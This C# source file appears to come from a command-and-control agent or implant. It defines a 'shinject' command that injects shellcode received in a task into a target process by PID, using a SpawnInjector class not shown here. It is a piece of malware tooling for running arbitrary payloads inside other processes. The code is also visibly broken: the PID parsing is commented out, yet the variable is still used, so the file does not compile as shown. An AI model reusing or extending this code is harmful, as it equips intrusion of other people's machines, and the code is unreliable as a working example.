﻿using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class ShellcodeInject : AgentCommand
    {
        public override string Name => "shinject";

        public override string Execute(AgentTask task)
        {
            //if (!int.TryParse(task.Arguments[0], out var pid))
              //  return "Failed to parse PID";


            var injector = new SpawnInjector();
            var success = injector.Inject(task.FileBytes, pid);

            if (success) return "Shellcode injected";
            else return "Failed to inject shellcode";
        }
    }
}